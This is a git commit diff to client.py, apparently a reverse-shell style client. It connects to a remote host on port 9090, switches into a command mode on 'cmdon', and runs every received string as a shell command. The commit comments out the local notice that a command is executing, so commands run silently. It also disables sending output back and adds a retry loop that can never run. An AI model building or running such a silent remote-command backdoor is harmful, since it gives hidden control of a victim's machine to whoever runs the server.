e315bd6021e6b59e2d87e10d29bf42175d4a5ae5
Salah Eddine Naouassih <salahnaouassih10@gmail.com>
2022-11-27 21:27:55 +0100

    updated client

--- client.py
+++ client.py
@@ -7,6 +7,7 @@ PORT = 9090
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((HOST, PORT))
 cmd_mode = False
+lastoutput = ""
 while True:
     server_command = client.recv(1024).decode('utf-8')
     if server_command == "cmdon":
@@ -16,10 +17,16 @@ while True:
     if server_command =="cmdoff":
         cmd_mode = False
     if cmd_mode:
-        print(f"Executing command {server_command}")
+        """ print(f"Executing command {server_command}") """
         with Popen(server_command, stdout=PIPE, stderr=None, shell=True) as process:
             output = process.communicate()[0].decode("utf-8")
-            client.send(f"Output of command: \n\n{output}".encode('utf-8'))
+            i  = 0
+            while lastoutput == output and i > 2:
+                output = process.communicate()[0].decode("utf-8")
+                i += 1
+            lastoutput = output
+            """ client.send(f"Output of command: \n\n{lastoutput}".encode('utf-8')) """
+            
     elif server_command == "quit_exploit":
         break
     else:
